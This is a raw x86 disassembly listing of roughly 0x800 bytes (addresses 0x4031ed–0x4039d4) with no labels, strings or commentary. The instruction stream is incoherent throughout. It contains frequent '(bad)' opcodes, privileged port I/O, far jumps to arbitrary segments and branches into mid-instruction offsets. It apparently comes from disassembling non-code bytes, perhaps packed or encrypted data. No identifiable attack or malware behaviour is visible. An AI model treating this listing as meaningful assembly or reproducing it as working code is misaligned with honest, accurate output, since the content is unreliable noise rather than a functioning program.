  4031ed:	fdivp  st(7),st
  4031ef:	cli    
  4031f0:	addr16 ret 
  4031f2:	push   cs
  4031f3:	mov    ah,0x9
  4031f5:	pop    edi
  4031f6:	adc    edx,DWORD PTR ds:0x391eb763
  4031fc:	fnstenv [eax]
  4031fe:	shl    DWORD PTR [edx+0x1440654a],0x31
  403205:	outs   dx,BYTE PTR ds:[esi]
  403206:	dec    edx
  403207:	das    
  403208:	push   edx
  403209:	fwait
  40320a:	mov    dl,0x79
  40320c:	repnz clc 
  40320e:	rol    dl,1
  403210:	ja     0x4031e2
  403212:	mov    dl,0xc4
  403214:	fs push eax
  403216:	(bad)  [edx-0x6e869bb7]
  40321c:	cmc    
  40321d:	(bad)  
  40321e:	fdiv   DWORD PTR [eax-0x615b47f5]
  403224:	ret    0x42f6
  403227:	outs   dx,DWORD PTR ds:[esi]
  403228:	pop    ebx
  403229:	mov    ds:0x2d7d48e2,al
  40322e:	mov    dl,0x6d
  403230:	sub    eax,0x8d3c4424
  403235:	adc    al,0xb4
  403237:	add    al,0xb8
  403239:	jecxz  0x40322e
  40323b:	std    
  40323c:	(bad)  
  40323d:	imul   ah
  40323f:	jecxz  0x403222
  403241:	outs   dx,DWORD PTR ds:[esi]
  403242:	jae    0x403291
  403244:	(bad)  
  403246:	mov    eax,ds:0x80d2f0a1
  40324b:	clc    
  40324c:	dec    esp
  40324d:	push   ss
  40324e:	mov    ch,0x80
  403250:	mov    esp,0xd4a9801c
  403255:	je     0x403292
  403257:	enter  0x815b,0xbf
  40325b:	mov    ecx,0x76430cb7
  403260:	popf   
  403261:	popf   
  403262:	stos   DWORD PTR es:[edi],eax
  403263:	lods   eax,DWORD PTR es:[esi]
  403265:	push   esi
  403266:	pop    esi
  403267:	in     al,dx
  403268:	enter  0x848b,0x48
  40326c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40326d:	scas   eax,DWORD PTR es:[edi]
  40326e:	push   ss
  40326f:	inc    esp
  403270:	imul   BYTE PTR [esi-0x1]
  403273:	push   ss
  403274:	sbb    eax,0x45bbc56
  403279:	jne    0x403284
  40327b:	push   0x60883e0b
  403280:	or     eax,0xe93239
  403285:	ins    DWORD PTR es:[edi],dx
  403286:	test   eax,0x4d95c0be
  40328b:	inc    ecx
  40328c:	mov    ebx,0x132e4612
  403291:	xor    cl,0x7f
  403294:	fidivr DWORD PTR [edi]
  403296:	adc    ebx,esi
  403298:	mov    esi,0xe050196f
  40329d:	mov    ebp,0x373ed4e2
  4032a2:	(bad)
  4032a5:	or     BYTE PTR [edi],cl
  4032a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032a8:	add    ch,BYTE PTR [ebx-0x45]
  4032ab:	adc    BYTE PTR [edx+edi*4-0xc],cl
  4032af:	pop    edi
  4032b0:	mov    ebx,0x61afcab3
  4032b5:	cs aam 0x7d
  4032b8:	idiv   DWORD PTR [ebx]
  4032ba:	(bad)  
  4032bb:	shr    DWORD PTR [edi+0x7472ecf2],cl
  4032c1:	and    BYTE PTR [ebp+0x19],bl
  4032c4:	in     al,0x49
  4032c6:	not    dl
  4032c8:	stos   DWORD PTR es:[edi],eax
  4032c9:	sbb    DWORD PTR [eax-0x4c],eax
  4032cc:	cmp    al,0x3
  4032ce:	dec    esi
  4032cf:	and    BYTE PTR [ebp+eax*4-0x3b],bh
  4032d3:	sub    al,0x86
  4032d5:	mov    DWORD PTR ds:0x77cc56ee,0x8bce946c
  4032df:	mov    ah,0xe0
  4032e1:	outs   dx,DWORD PTR ds:[esi]
  4032e2:	mov    cl,0x51
  4032e4:	adc    edi,ebp
  4032e6:	xor    BYTE PTR [eax],dl
  4032e8:	pop    sp
  4032ea:	sar    DWORD PTR [esi],cl
  4032ec:	rcr    BYTE PTR [edx],1
  4032ee:	rcr    ah,cl
  4032f0:	icebp  
  4032f1:	cmp    eax,0xe97ee1e7
  4032f6:	jnp    0x4032f8
  4032f8:	test   eax,0xa0a2ccbc
  4032fd:	out    dx,eax
  4032fe:	cs in  al,dx
  403300:	pusha  
  403301:	sar    DWORD PTR [eax+eiz*4],cl
  403304:	cwde   
  403305:	int    0xa8
  403307:	sub    BYTE PTR [eax+0x6e3b6cc3],dh
  40330d:	xor    DWORD PTR [ebx+0x379ce08e],edx
  403313:	add    eax,0x62c9321
  403318:	(bad)  
  403319:	ds scas eax,DWORD PTR es:[edi]
  40331b:	mov    eax,0xf48c6322
  403320:	mul    BYTE PTR [esi-0x4b]
  403323:	ret    
  403324:	scas   al,BYTE PTR es:[edi]
  403325:	pop    ebp
  403326:	cmp    ebx,DWORD PTR [ebx+0x1b0b81ed]
  40332c:	call   0x2281:0xa99de7b8
  403333:	and    bl,dh
  403335:	hlt    
  403336:	in     eax,0x51
  403338:	inc    esi
  403339:	dec    esi
  40333a:	sti    
  40333b:	xchg   ebx,eax
  40333c:	ret    
  40333d:	xchg   edx,eax
  40333e:	mov    al,ds:0xc84787e0
  403343:	sub    al,0x5d
  403345:	inc    edx
  403346:	addr16 sbb edx,edi
  403349:	add    DWORD PTR [ebp+0x6c3425cd],0x5b
  403350:	cli    
  403351:	lahf   
  403352:	mov    edx,0x1806b938
  403357:	and    bh,BYTE PTR [ebx]
  403359:	xor    DWORD PTR [ebx-0x136d7860],esp
  40335f:	push   ecx
  403360:	std    
  403361:	daa    
  403362:	cmp    BYTE PTR [ecx],0xb2
  403365:	pop    esi
  403366:	mov    dh,0xf0
  403368:	fsub   QWORD PTR [edi-0x19]
  40336b:	jle    0x4032f7
  40336d:	xor    eax,0xc240f8c
  403372:	sbb    bl,BYTE PTR [esi-0x63]
  403375:	and    BYTE PTR [esi+edx*8-0x7c],0x8a
  40337a:	xor    BYTE PTR [esi+0x23],0xd
  40337e:	and    DWORD PTR [ebx-0xc],0xffffffc1
  403382:	mov    ds,WORD PTR [ebp+0x59a7e4bc]
  403388:	loop   0x4033cf
  40338a:	fcomp  QWORD PTR [eax+0x21]
  40338d:	popa   
  40338e:	not    bl
  403390:	sahf   
  403391:	rol    DWORD PTR [esi-0x3ba639a],cl
  403397:	jb     0x403362
  403399:	sub    BYTE PTR [ecx],dh
  40339b:	(bad)  
  40339c:	xor    BYTE PTR [edx],cl
  40339e:	or     BYTE PTR [ecx+0x40],0x94
  4033a2:	lods   al,BYTE PTR ds:[esi]
  4033a3:	jge    0x4033d9
  4033a5:	sub    al,0xae
  4033a7:	or     DWORD PTR [ebp-0x79],esp
  4033aa:	inc    ebx
  4033ab:	in     eax,0x1
  4033ad:	push   eax
  4033ae:	dec    edx
  4033af:	xchg   ecx,eax
  4033b0:	push   edi
  4033b1:	push   esi
  4033b2:	or     esp,DWORD PTR [ebx-0x68aabb62]
  4033b8:	aas    
  4033b9:	sbb    cl,cl
  4033bb:	dec    ecx
  4033bc:	push   ss
  4033bd:	jb     0x4033a7
  4033bf:	js     0x4033a0
  4033c1:	push   ebp
  4033c2:	sub    ch,BYTE PTR [edx+0x162507d9]
  4033c8:	push   eax
  4033c9:	ror    edi,0xe9
  4033cc:	lods   eax,DWORD PTR ds:[esi]
  4033cd:	hlt    
  4033ce:	stos   BYTE PTR es:[edi],al
  4033cf:	sbb    DWORD PTR [ebp+eiz*1+0x51f8d175],ecx
  4033d6:	mov    BYTE PTR [ebx],dh
  4033d8:	jmp    0xfa98:0xd6610ea8
  4033df:	adc    ch,ch
  4033e1:	and    ebx,DWORD PTR [eax+0x28d3c126]
  4033e7:	inc    edx
  4033e8:	ror    BYTE PTR [ebp-0x211462b],1
  4033ee:	jb     0x40345f
  4033f0:	sub    cl,BYTE PTR ds:0xbbaed6af
  4033f6:	pop    edx
  4033f7:	stos   DWORD PTR es:[edi],eax
  4033f8:	push   DWORD PTR [eax-0x78]
  4033fb:	inc    ebx
  4033fc:	mov    eax,ds:0xbabfbfff
  403401:	sbb    al,bh
  403403:	add    ebp,DWORD PTR [ecx+0x45049266]
  403409:	lea    edi,[ebp-0x62]
  40340c:	xor    DWORD PTR [ecx+0x22fe0eae],eax
  403412:	jnp    0x4033e4
  403414:	test   al,0x8a
  403416:	xor    al,BYTE PTR [esi+0x45]
  403419:	and    eax,0xfa5ee584
  40341e:	add    edi,DWORD PTR [ebx+0x1d6e3ac6]
  403424:	sbb    ebx,edi
  403426:	sbb    BYTE PTR [eax],bl
  403428:	dec    esi
  403429:	or     DWORD PTR [edx-0x73],edi
  40342c:	mov    ebx,0x59efa3cf
  403431:	fxch   st(5)
  403433:	sahf   
  403434:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403435:	scas   eax,DWORD PTR es:[edi]
  403436:	xor    ah,ch
  403438:	xor    DWORD PTR [esi+eax*4],eax
  40343b:	rcl    DWORD PTR [edx+0x55e21cb1],1
  403441:	pop    ss
  403442:	mov    WORD PTR [edx],?
  403444:	xor    esi,DWORD PTR [eax-0x511210b7]
  40344a:	fiadd  WORD PTR [ebx-0x58]
  40344d:	mov    ecx,0xbcde558a
  403452:	dec    edx
  403453:	call   0xb85f:0xdd951367
  40345a:	pop    ebx
  40345b:	pushf  
  40345c:	cdq    
  40345d:	xchg   BYTE PTR [esi],ch
  40345f:	sub    eax,DWORD PTR [ebp-0x4b6c472f]
  403465:	mov    dh,0xd6
  403467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403468:	hlt    
  403469:	les    esi,FWORD PTR [esp+edx*2-0x3b]
  40346d:	xor    BYTE PTR [esi],dl
  40346f:	add    al,0x84
  403471:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403472:	pop    edx
  403473:	clc    
  403474:	(bad)  
  403476:	mov    al,BYTE PTR [ebx]
  403478:	fdivr  QWORD PTR [ebp-0x3801f42a]
  40347e:	(bad)  
  40347f:	neg    DWORD PTR [eax+0x7e]
  403482:	(bad)  
  403483:	jmp    0x4034ec
  403485:	into   
  403486:	test   DWORD PTR [esi+0x61],esi
  403489:	xchg   DWORD PTR [esi+edx*4],esi
  40348c:	push   ds
  40348d:	gs fsubrp st(4),st
  403490:	xor    bl,0x93
  403493:	mov    al,ds:0x7dc573d7
  403498:	retf   0xd568
  40349b:	inc    edx
  40349c:	cwde   
  40349d:	add    eax,eax
  40349f:	mov    eax,0x90114eae
  4034a4:	jo     0x4034d5
  4034a6:	mov    ebx,0x4408064
  4034ab:	mov    eax,0xf73d0f15
  4034b0:	cmp    eax,0x9ef6c288
  4034b5:	mov    eax,ds:0x740dc128
  4034ba:	xchg   ebp,eax
  4034bb:	jno    0x4034dd
  4034bd:	mov    bh,0x89
  4034bf:	xor    DWORD PTR [ecx+0x10dabdde],ebp
  4034c5:	lea    esp,[ecx+0x73]
  4034c8:	cwde   
  4034c9:	dec    ebp
  4034ca:	or     DWORD PTR [edi+0x15],0xffffffa8
  4034ce:	add    DWORD PTR [esi-0x59],eax
  4034d1:	(bad)  
  4034d3:	aad    0x7
  4034d5:	loope  0x4034d2
  4034d7:	int    0x93
  4034d9:	clc    
  4034da:	pushf  
  4034db:	ds mov ebp,0xe1e64d75
  4034e1:	push   ds
  4034e2:	mov    esp,0xc731f899
  4034e7:	nop
  4034e8:	sbb    al,0x42
  4034ea:	xlat   BYTE PTR ds:[ebx]
  4034eb:	rcl    DWORD PTR [ecx],cl
  4034ed:	cmp    eax,0x9443515e
  4034f2:	sub    edx,DWORD PTR [edi]
  4034f4:	jns    0x4034cc
  4034f6:	mov    ch,0x8d
  4034f8:	sub    BYTE PTR [eax+0x31],0xab
  4034fc:	xor    ah,BYTE PTR [eax-0x24]
  4034ff:	scas   al,BYTE PTR es:[edi]
  403500:	cmp    esi,DWORD PTR [ebx-0x7f4fac4]
  403506:	push   eax
  403507:	outs   dx,DWORD PTR ds:[esi]
  403508:	cli    
  403509:	outs   dx,DWORD PTR ds:[esi]
  40350a:	sbb    eax,0xd0bf7276
  40350f:	call   0xb754d860
  403514:	mov    bh,0x30
  403516:	retf   
  403517:	or     eax,0xa33b691a
  40351c:	arpl   WORD PTR [esi],ax
  40351e:	not    DWORD PTR [ecx+0x9]
  403521:	out    0x4c,al
  403523:	and    DWORD PTR ds:0x5d1ef4be,esi
  403529:	inc    ebp
  40352a:	sub    al,0x89
  40352c:	shl    esi,1
  40352e:	or     bh,BYTE PTR [edi-0x2a]
  403531:	pop    eax
  403532:	add    DWORD PTR [esi],esi
  403534:	repz adc dl,BYTE PTR [ebx+0x30413471]
  40353b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40353c:	jne    0x4035ac
  40353e:	jns    0x40352e
  403540:	daa    
  403541:	cmp    ecx,esp
  403543:	test   al,0x39
  403545:	pushf  
  403546:	retf   
  403547:	fistp  QWORD PTR [edi]
  403549:	xor    DWORD PTR [edx],edx
  40354b:	pop    ebx
  40354c:	xchg   edi,eax
  40354d:	and    esi,DWORD PTR [ebx+0x32]
  403550:	sub    ah,BYTE PTR [ebx]
  403552:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403553:	fistp  WORD PTR [esi+0x27]
  403556:	daa    
  403557:	xchg   ebx,eax
  403558:	push   0x6e
  40355a:	mov    al,0x4a
  40355c:	adc    edx,DWORD PTR [ebx+edx*1+0x1178b8c7]
  403563:	aad    0x54
  403565:	jmp    0xd6d903d
  40356a:	mov    bh,0xc8
  40356c:	and    al,0x14
  40356e:	shr    DWORD PTR [edi-0x73],1
  403571:	lods   eax,DWORD PTR ds:[esi]
  403572:	out    dx,al
  403573:	bound  eax,QWORD PTR [esi-0x3a804430]
  403579:	fisttp DWORD PTR [ebx]
  40357b:	in     al,0x52
  40357d:	ret    
  40357e:	rcl    BYTE PTR [eax-0xb],cl
  403581:	ss inc ebx
  403583:	mov    eax,ds:0xf2260990
  403588:	(bad)  [eax]
  40358a:	dec    esi
  40358b:	bound  esp,QWORD PTR [edx-0x16]
  40358e:	push   eax
  40358f:	mov    ds:0x3ee20920,al
  403594:	and    BYTE PTR [edi-0x5037c347],ah
  40359a:	dec    esp
  40359b:	loop   0x4035fd
  40359d:	rcl    BYTE PTR [ebx],cl
  40359f:	mov    edi,0x4e82fd7c
  4035a4:	dec    ebp
  4035a5:	lods   al,BYTE PTR ds:[esi]
  4035a6:	retf   
  4035a7:	pop    esp
  4035a8:	mov    eax,ds:0xede7c636
  4035ad:	bswap  esp
  4035af:	das    
  4035b0:	add    BYTE PTR [ebp-0x3b],al
  4035b3:	das    
  4035b4:	fbstp  TBYTE PTR [ebx-0x21bedc02]
  4035ba:	jg     0x403634
  4035bc:	add    DWORD PTR [ecx],edx
  4035be:	push   es
  4035bf:	adc    edx,DWORD PTR [edi-0x7c496aff]
  4035c5:	aad    0x9d
  4035c7:	inc    esp
  4035c8:	loop   0x4035b9
  4035ca:	sahf   
  4035cb:	xor    ah,BYTE PTR [eax-0x65802140]
  4035d1:	xor    dh,BYTE PTR [esi]
  4035d3:	repz jnp 0x403639
  4035d6:	or     eax,0x2b8d784d
  4035db:	or     BYTE PTR [edx],bl
  4035dd:	pop    ebx
  4035de:	and    ebx,DWORD PTR [ebx-0x342bf074]
  4035e4:	sahf   
  4035e5:	cmp    dh,BYTE PTR [ebp-0x4327edc1]
  4035eb:	push   ss
  4035ec:	push   ecx
  4035ed:	push   cs
  4035ee:	or     al,0x76
  4035f0:	mov    BYTE PTR [ebx-0x1094f529],dh
  4035f6:	sbb    edi,ebx
  4035f8:	and    bl,dl
  4035fa:	hlt    
  4035fb:	mov    eax,DWORD PTR [esi]
  4035fd:	fmul   QWORD PTR ds:0xc3d10554
  403603:	sub    al,0x6a
  403605:	jns    0x403671
  403607:	push   esp
  403608:	outs   dx,DWORD PTR ds:[esi]
  403609:	pop    esi
  40360a:	lahf   
  40360b:	mov    ah,0xc2
  40360d:	rcl    DWORD PTR [edi+edx*4+0x1a],0xcf
  403612:	daa    
  403613:	xchg   edi,eax
  403614:	sub    al,0x3e
  403616:	mov    DWORD PTR [ebp-0x31],ebp
  403619:	retf   0xcc5a
  40361c:	push   esi
  40361d:	sti    
  40361e:	pusha  
  40361f:	sub    edx,DWORD PTR [ebx]
  403621:	in     al,0xd7
  403623:	repz push ecx
  403625:	push   esi
  403626:	mov    edi,0xbde4e72d
  40362b:	(bad)  [edx+0x40]
  40362e:	ins    BYTE PTR es:[edi],dx
  40362f:	xor    edx,DWORD PTR [eax]
  403631:	push   edi
  403632:	sub    esp,DWORD PTR cs:[ebp+edi*1-0x69]
  403637:	mov    cl,ch
  403639:	xchg   DWORD PTR [ebp+0x4],ebx
  40363c:	cmp    DWORD PTR [edx],0x329724b2
  403642:	jmp    0x260b:0x8b0817e4
  403649:	inc    ebx
  40364a:	popf   
  40364b:	in     eax,0x79
  40364d:	mov    edi,0x42df9404
  403652:	retfw  0x47be
  403656:	sbb    dh,BYTE PTR [ebx-0x22854dd9]
  40365c:	push   ebp
  40365d:	outs   dx,BYTE PTR ds:[esi]
  40365e:	cmp    ecx,edi
  403660:	cs pusha 
  403662:	pop    esi
  403663:	dec    ecx
  403664:	lods   eax,DWORD PTR ds:[esi]
  403665:	cmp    al,bl
  403667:	push   cs
  403668:	rcr    ebx,cl
  40366a:	fnstsw WORD PTR [edi+0x6dd394b6]
  403670:	pop    ecx
  403671:	popf   
  403672:	outs   dx,BYTE PTR es:[esi]
  403674:	jbe    0x4036bc
  403676:	out    dx,eax
  403677:	xchg   ecx,eax
  403678:	sub    eax,0x277718c1
  40367d:	jo     0x403652
  40367f:	sub    eax,0xa1b49f06
  403684:	lock dec ebp
  403686:	(bad)  
  403687:	mov    ch,0xe8
  403689:	cdq    
  40368a:	nop
  40368b:	cs push ds
  40368d:	popf   
  40368e:	sbb    al,0x3d
  403690:	push   edi
  403691:	daa    
  403692:	mov    ah,0xc9
  403694:	dec    edi
  403695:	fimul  DWORD PTR [ebx]
  403697:	add    BYTE PTR [esi+0x391209f],ch
  40369d:	and    DWORD PTR [edx-0x47215d21],eax
  4036a3:	dec    eax
  4036a4:	test   al,0xfe
  4036a6:	fcmovnu st,st(1)
  4036a8:	mov    al,ds:0xfec7c6fb
  4036ad:	sbb    ecx,esp
  4036af:	adc    al,dh
  4036b1:	sti    
  4036b2:	fidivr WORD PTR [ecx+0xf16f970]
  4036b8:	js     0x40364e
  4036ba:	inc    edx
  4036bb:	mov    edi,0x53680025
  4036c0:	data16 mov ds:0x8bd6169,al
  4036c6:	add    esi,ebx
  4036c8:	lods   al,BYTE PTR ds:[esi]
  4036c9:	and    BYTE PTR [ebx],dh
  4036cb:	push   ds
  4036cc:	inc    ecx
  4036cd:	add    edx,DWORD PTR [eax]
  4036cf:	loop   0x403669
  4036d1:	jno    0x4036df
  4036d3:	jo     0x4036ae
  4036d5:	mov    bl,0xbd
  4036d7:	std    
  4036d8:	stos   DWORD PTR es:[edi],eax
  4036d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036da:	dec    esi
  4036db:	imul   edx,DWORD PTR [edx+0x16],0x5dce48d5
  4036e2:	cs sub al,0x37
  4036e5:	popa   
  4036e6:	xor    eax,esi
  4036e8:	jbe    0x4036ad
  4036ea:	and    dh,BYTE PTR [edi-0x77437720]
  4036f0:	and    eax,DWORD PTR [ecx+0x60ff5233]
  4036f6:	xor    eax,0x814db98b
  4036fb:	les    ebx,FWORD PTR [edi]
  4036fd:	dec    esi
  4036fe:	sbb    DWORD PTR [edi+0x43],ebp
  403701:	loop   0x4036aa
  403703:	cmp    eax,0xef8a8a1b
  403708:	inc    esp
  403709:	lahf   
  40370a:	in     al,dx
  40370b:	ss push 0x3c11929d
  403711:	jb     0x403744
  403713:	jne    0x40370e
  403715:	cmp    ch,ch
  403717:	jmp    0x783d:0x1f061f1c
  40371e:	jle    0x4036ed
  403720:	xchg   edi,eax
  403721:	ffree  st(6)
  403723:	add    DWORD PTR [edi+0x649f330c],edx
  403729:	pushf  
  40372a:	push   cs
  40372b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40372c:	mov    eax,0xdd86f4e3
  403731:	dec    esi
  403732:	jae    0x4036ff
  403734:	outs   dx,DWORD PTR ds:[esi]
  403735:	mov    ds:0xe834255b,eax
  40373a:	(bad)  
  40373b:	lea    edi,[ebx-0x79695f82]
  403741:	aad    0xc
  403743:	sti    
  403744:	xor    eax,0xfbb2fccf
  403749:	idiv   BYTE PTR [ebp+0xf0e0fa0]
  40374f:	call   0xca70:0xd02be367
  403756:	imul   DWORD PTR [edx+ebx*1+0x7e]
  40375a:	test   al,0x9a
  40375c:	in     eax,0x2
  40375e:	fucomi st,st(3)
  403760:	xlat   BYTE PTR ds:[ebx]
  403761:	pop    ss
  403762:	dec    edi
  403763:	and    dl,BYTE PTR [esi-0x5e]
  403766:	cmp    al,0xb8
  403768:	in     al,dx
  403769:	test   edx,esp
  40376b:	cmp    esi,DWORD PTR [eax+0x2def6a3]
  403771:	jae    0x403721
  403773:	hlt    
  403774:	xor    esi,edi
  403776:	or     BYTE PTR [eax+0x596db1b4],dl
  40377c:	push   0xffffffcb
  40377e:	mov    ecx,0xbc379c62
  403783:	dec    edx
  403784:	inc    ebx
  403785:	xchg   BYTE PTR [esi-0x5b],dh
  403788:	ds jbe 0x40371e
  40378b:	sub    eax,DWORD PTR [ecx]
  40378d:	scas   al,BYTE PTR es:[edi]
  40378e:	pop    eax
  40378f:	(bad)  
  403790:	ins    DWORD PTR es:[edi],dx
  403791:	jl     0x40372c
  403793:	cmp    DWORD PTR [edi-0xedbdfd2],ecx
  403799:	mov    esp,0x548eda39
  40379e:	mov    ch,0x92
  4037a0:	add    DWORD PTR [edi+0x49],ebp
  4037a3:	lds    eax,FWORD PTR ds:0xf36625c2
  4037a9:	and    al,0xa3
  4037ab:	dec    edi
  4037ac:	xchg   ebp,eax
  4037ad:	faddp  st(6),st
  4037af:	sub    al,BYTE PTR [edx+0x62]
  4037b2:	lea    edx,[ecx]
  4037b4:	xchg   ebx,eax
  4037b5:	add    ch,BYTE PTR [eax]
  4037b7:	loop   0x403794
  4037b9:	inc    edx
  4037ba:	push   ds
  4037bb:	push   esi
  4037bc:	xchg   ecx,eax
  4037bd:	mov    DWORD PTR [eax-0x26b5841b],0x587e1d40
  4037c7:	push   edx
  4037c8:	mov    esp,0x8bdf1973
  4037cd:	inc    ebp
  4037ce:	aaa    
  4037cf:	loop   0x4037b7
  4037d1:	jbe    0x40377d
  4037d3:	outs   dx,DWORD PTR ds:[esi]
  4037d4:	outs   dx,BYTE PTR ds:[esi]
  4037d5:	rcr    BYTE PTR [edx+0x9],1
  4037d8:	inc    esp
  4037d9:	cld    
  4037da:	jecxz  0x4037b8
  4037dc:	xor    dl,ah
  4037de:	shl    edx,0x6
  4037e1:	test   eax,0xe4be7d41
  4037e6:	push   ebp
  4037e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037e8:	mov    ah,0x14
  4037ea:	int    0x99
  4037ec:	call   0x53a375e9
  4037f1:	imul   ebx,ebp,0x1d3f60ec
  4037f7:	vpavgb xmm5,xmm0,XMMWORD PTR [esp+edi*8-0x1f38b0e1]
  403801:	sub    edx,edi
  403803:	push   edx
  403804:	imul   esi,edi,0x3fbd5ad0
  40380a:	xor    al,0x6
  40380c:	mov    ecx,0x8fb818a9
  403811:	rol    DWORD PTR [esi-0x615b0617],1
  403817:	xchg   edx,eax
  403818:	lds    edi,FWORD PTR [ebx-0x3c]
  40381b:	mov    bl,0x60
  40381d:	bound  eax,QWORD PTR [ebp+0x73]
  403820:	adc    al,0x1a
  403822:	push   cs
  403823:	mov    bh,0x6b
  403825:	or     BYTE PTR [eax+0x61968e14],dh
  40382b:	stos   BYTE PTR es:[edi],al
  40382c:	shr    ah,cl
  40382e:	pop    esp
  40382f:	aam    0xf2
  403831:	sub    cl,BYTE PTR [eax-0x21073d5e]
  403837:	jns    0x4037ec
  403839:	out    dx,al
  40383a:	ss call 0x48121689
  403840:	stc    
  403841:	inc    edx
  403842:	loope  0x403842
  403844:	sub    DWORD PTR [eax+edx*4],esi
  403847:	push   ecx
  403848:	dec    esp
  403849:	xchg   edi,eax
  40384a:	dec    edx
  40384b:	xchg   edx,eax
  40384c:	add    al,0xc3
  40384e:	and    esi,DWORD PTR [edi]
  403850:	daa    
  403851:	shl    BYTE PTR [edx+0x65450160],1
  403857:	repz mov ch,0x5b
  40385a:	adc    bh,bh
  40385c:	push   esp
  40385d:	cmp    ah,al
  40385f:	es xchg ebx,eax
  403861:	mov    dh,0x38
  403863:	inc    ebp
  403864:	cmc    
  403865:	and    ch,BYTE PTR [eax+edx*4-0x69d22d26]
  40386c:	add    eax,0xf7b6d1b9
  403871:	or     BYTE PTR [eax-0x1d621034],dh
  403877:	jl     0x4038dc
  403879:	(bad)  
  40387b:	dec    ebx
  40387c:	cmp    DWORD PTR [esi+0x22],esi
  40387f:	pop    esi
  403880:	outs   dx,DWORD PTR ds:[esi]
  403881:	dec    edi
  403882:	xchg   DWORD PTR [ecx+0xd],eax
  403885:	shl    ch,0x13
  403888:	adc    bl,bl
  40388a:	test   al,0x23
  40388c:	int3   
  40388d:	and    DWORD PTR [ecx*4+0x1c869bdd],0x59
  403895:	mov    edi,esp
  403897:	mov    ch,0xe8
  403899:	sahf   
  40389a:	jnp    0x403893
  40389c:	cwde   
  40389d:	jmp    0x4038fe
  40389f:	not    cl
  4038a1:	jae    0x4038e9
  4038a3:	inc    ebp
  4038a4:	fild   DWORD PTR ds:0xdd661ce
  4038aa:	loop   0x4038fd
  4038ac:	push   ds
  4038ad:	dec    ebp
  4038ae:	xchg   dl,bh
  4038b0:	scas   eax,DWORD PTR es:[edi]
  4038b1:	pusha  
  4038b2:	and    eax,0xe2f9aa00
  4038b7:	iret   
  4038b8:	push   edx
  4038b9:	mov    eax,0x73e956fa
  4038be:	xor    BYTE PTR [ecx+0x5c],bh
  4038c1:	or     ah,bl
  4038c3:	adc    DWORD PTR [eax+0x55],ecx
  4038c6:	lods   eax,DWORD PTR ds:[esi]
  4038c7:	outs   dx,DWORD PTR ds:[esi]
  4038c8:	popa   
  4038c9:	mov    ebp,0xf8a1a1ab
  4038ce:	jl     0x4038f2
  4038d0:	pop    edi
  4038d1:	pop    esp
  4038d2:	mov    DWORD PTR [esi+0x561e9cc3],edi
  4038d8:	(bad)  
  4038da:	iret   
  4038db:	push   ds
  4038dc:	sbb    DWORD PTR [esi-0x24e2910a],0xdaa0a1f8
  4038e6:	jl     0x403938
  4038e8:	in     al,0x49
  4038ea:	xchg   edx,eax
  4038eb:	add    al,0x2d
  4038ed:	fwait
  4038ee:	jbe    0x403930
  4038f0:	in     eax,dx
  4038f1:	das    
  4038f2:	imul   esi,ebp,0x10ff57c3
  4038f8:	xor    eax,0x2f3e2dc5
  4038fd:	cli    
  4038fe:	xchg   edx,eax
  4038ff:	loope  0x40389b
  403901:	repnz repz and DWORD PTR [edi-0x7dc7b4d2],esi
  403909:	daa    
  40390a:	cs mov gs,ebp
  40390d:	(bad)  
  40390e:	shl    BYTE PTR [edi],cl
  403910:	shl    DWORD PTR [ebp+0x11122c75],cl
  403916:	cs cmp al,0x88
  403919:	clc    
  40391a:	push   eax
  40391b:	or     eax,0xd2e60ad5
  403920:	xlat   BYTE PTR ds:[ebx]
  403921:	dec    esi
  403922:	shl    BYTE PTR [esp+eiz*8-0x776d3dca],1
  403929:	ret    0x9626
  40392c:	push   ecx
  40392d:	mov    cl,0x9c
  40392f:	cmp    BYTE PTR [edx+0x21],ch
  403932:	adc    ecx,DWORD PTR [eax-0x370f84de]
  403938:	out    0x89,al
  40393a:	sub    dh,dl
  40393c:	sbb    al,0x5b
  40393e:	cmp    eax,0xd8f53f20
  403943:	mov    ds:0x3bec96c5,al
  403948:	adc    ah,BYTE PTR [edi-0x16]
  40394b:	fsub   DWORD PTR [ebp+0x70b9b5ab]
  403951:	mov    ebp,0xf356a7e5
  403956:	sub    al,0xee
  403958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403959:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40395a:	mov    al,0x9d
  40395c:	and    dh,BYTE PTR [eax+0x4d]
  40395f:	cld    
  403960:	nop
  403961:	dec    edi
  403962:	ret    
  403963:	dec    edx
  403964:	fiadd  DWORD PTR [esi+0x4b]
  403967:	xor    DWORD PTR [esi],eax
  403969:	xor    BYTE PTR [edi-0x41],dl
  40396c:	test   DWORD PTR [eax+ebp*1],ecx
  40396f:	ret    
  403970:	popf   
  403971:	jnp    0x4039a6
  403973:	sbb    si,WORD PTR [edi-0x49685659]
  40397a:	dec    edi
  40397b:	add    BYTE PTR [eax+0x65],cl
  40397e:	dec    esp
  40397f:	test   BYTE PTR [edi-0x2c30d40a],dh
  403985:	pop    edi
  403986:	ficom  DWORD PTR [esi+esi*4+0x2fde037]
  40398d:	iret   
  40398e:	add    eax,0xb4fc152a
  403993:	and    eax,0x2e059391
  403998:	xor    eax,0xbcdc0e16
  40399d:	lea    edx,[ecx]
  40399f:	dec    edx
  4039a0:	into   
  4039a1:	mov    DWORD PTR [ebp-0x2876bb24],esp
  4039a7:	popf   
  4039a8:	(bad)  
  4039a9:	stc    
  4039aa:	cmp    al,0x66
  4039ac:	xchg   ebp,eax
  4039ad:	(bad)  
  4039ae:	in     al,0x18
  4039b0:	cld    
  4039b1:	ret    
  4039b2:	jmp    0x403940
  4039b4:	cmp    esi,edi
  4039b6:	pop    edi
  4039b7:	cmp    bh,BYTE PTR [edi+0x5]
  4039ba:	popf   
  4039bb:	fmul   st,st(3)
  4039bd:	pop    esp
  4039be:	adc    DWORD PTR [ebp+0x23],ebp
  4039c1:	imul   eax,DWORD PTR [esi+0x670f8382],0x7c3c18df
  4039cb:	mov    edi,0x9213703
  4039d0:	push   0xffffffb7
  4039d2:	sbb    ah,bh
  4039d4:	inc    edi
